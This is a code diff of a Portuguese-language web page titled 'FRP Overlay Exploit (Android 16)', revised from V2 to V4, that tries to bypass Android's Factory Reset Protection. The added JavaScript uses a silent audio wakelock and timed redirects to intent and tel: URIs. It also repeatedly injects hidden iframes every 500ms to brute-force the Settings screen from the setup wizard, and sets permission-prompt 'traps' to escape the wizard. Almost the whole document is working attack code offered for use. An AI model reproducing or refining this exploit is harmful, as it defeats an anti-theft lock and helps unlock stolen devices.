@@ -3,46 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FRP Overlay Exploit (Android 16) - V2</title>
+    <title>FRP Overlay Exploit (Android 16) - V4 (Pivots Avançados)</title>
     <style>
         body { font-family: -apple-system, sans-serif; padding: 20px; background-color: #121212; color: #ffffff; }
         .btn { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; }
         .btn-danger { background: #dc3545; }
         .btn-warning { background: #ffc107; color: #000; }
         .btn-success { background: #28a745; }
+        .btn-info { background: #17a2b8; }
         #status { margin-top: 20px; font-weight: bold; color: #ffc107; text-align: center; }
         h2 { font-size: 20px; margin-bottom: 5px; }
         p { font-size: 13px; color: #ccc; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <h2>🚀 Bypass via Deep Links</h2>
-    <p>O WebView bloqueia "intent://". Vamos usar esquemas universais (tel, mailto, web).</p>
+    <h2>🚀 Fase 4: Bypass Moderno</h2>
 
     <audio id="wakelock" loop>
         <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
     </audio>
 
-    <!-- NOVAS ROTAS (Fuga de WebView) -->
-    <button class="btn btn-success" onclick="iniciarBomba('tel:112')">
-        1. Forçar Discador (Esquema 'tel:')
+    <!-- Estratégia de Chamada Ativa (Altere o número para o SEU celular) -->
+    <button class="btn btn-success" onclick="iniciarBomba('tel:SEU_NUMERO_AQUI')">
+        1. Injetar Chamada Ativa (Substitua o número)
     </button>
 
-    <button class="btn btn-warning" onclick="iniciarBomba('mailto:admin@google.com')">
-        2. Forçar Gmail (Esquema 'mailto:')
-    </button>
-
-    <button class="btn" onclick="iniciarBomba('https://play.google.com/store/apps/details?id=com.android.settings')">
-        3. Forçar Play Store (Deep Link)
-    </button>
-
-    <!-- Rota de PIN com formatação alternativa (Tenta escapar via iframe) -->
-    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;category=android.intent.category.DEFAULT;end')">
-        4. Criação de PIN (Modo Iframe)
+    <!-- Estratégia de Pop-up de Permissão do Sistema -->
+    <button class="btn btn-warning" onclick="forcarPermissaoCamera()">
+        2. Armadilha: Pedir Permissão de Câmera
     </button>
     
-    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.settings.SETTINGS;end')">
-        5. Configurações (Modo Iframe)
+    <button class="btn btn-info" onclick="forcarPermissaoLocalizacao()">
+        3. Armadilha: Pedir Permissão de Localização
+    </button>
+
+    <!-- Estratégia de Loop (Tentar exaurir o verificador do AMS) -->
+    <button class="btn btn-danger" onclick="iniciarBombaLoop('intent:#Intent;action=android.settings.SETTINGS;end')">
+        4. Força Bruta (Abrir Configurações em Loop)
     </button>
 
     <div id="status">Aguardando comando...</div>
@@ -50,34 +47,69 @@
     <script>
         function iniciarBomba(intentUri) {
             let audio = document.getElementById('wakelock');
-            audio.play().catch(e => console.log("Audio play blocker", e));
+            audio.play().catch(e => console.log(e));
 
             let tempoAlvo = Date.now() + 10000; 
             const statusDiv = document.getElementById('status');
             
             const intervalo = setInterval(() => {
                 let tempoRestante = Math.ceil((tempoAlvo - Date.now()) / 1000);
-
                 if (tempoRestante > 0) {
-                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>Injetando tela em: ${tempoRestante}s`;
+                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>Injetando em: ${tempoRestante}s`;
                 } else {
                     clearInterval(intervalo);
-                    statusDiv.innerHTML = "💥 INJETANDO CÓDIGO...";
-                    
-                    // MÉTODO 1: Redirecionamento Direto
+                    statusDiv.innerHTML = "💥 INJETANDO...";
                     window.location.href = intentUri;
+                    audio.pause();
+                }
+            }, 200);
+        }
+
+        // Função de Força Bruta: Se o Android "mata" a tela em 1 segundo, vamos abri-la a cada 500ms
+        function iniciarBombaLoop(intentUri) {
+            let audio = document.getElementById('wakelock');
+            audio.play().catch(e => console.log(e));
+            
+            let tempoAlvo = Date.now() + 10000; 
+            const statusDiv = document.getElementById('status');
+            
+            const intervalo = setInterval(() => {
+                let tempoRestante = Math.ceil((tempoAlvo - Date.now()) / 1000);
+                if (tempoRestante > 0) {
+                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD!<br>Loop inicia em: ${tempoRestante}s`;
+                } else {
+                    clearInterval(intervalo);
+                    statusDiv.innerHTML = "💥 LOOP ATIVADO (Ataque AMS)...";
                     
-                    // MÉTODO 2: Injeção via Iframe Oculto (Bypassa algumas proteções do WebView)
-                    setTimeout(() => {
+                    // Dispara a tentativa de abrir as configurações repetidamente
+                    setInterval(() => {
                         let iframe = document.createElement('iframe');
                         iframe.style.display = 'none';
                         iframe.src = intentUri;
                         document.body.appendChild(iframe);
-                    }, 500);
-
-                    audio.pause();
+                    }, 500); // Tenta abrir a cada meio segundo
                 }
             }, 200);
+        }
+
+        // Funções para evocar o PermissionController do Android
+        function forcarPermissaoCamera() {
+            setTimeout(() => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => alert("Câmera liberada. Tente clicar nas definições."))
+                .catch(err => alert("Bloqueado. Tente a localização."));
+            }, 10000); // 10 segundos para você voltar ao Setup Wizard
+            document.getElementById('status').innerHTML = "⚠️ VOLTE PARA O SETUP WIZARD!<br>O pop-up de câmera aparecerá em 10s.";
+        }
+
+        function forcarPermissaoLocalizacao() {
+            setTimeout(() => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => alert("Localização acessada."),
+                    err => alert("Erro: " + err.message)
+                );
+            }, 10000);
+            document.getElementById('status').innerHTML = "⚠️ VOLTE PARA O SETUP WIZARD!<br>O pop-up de localização aparecerá em 10s.";
         }
     </script>
 </body>
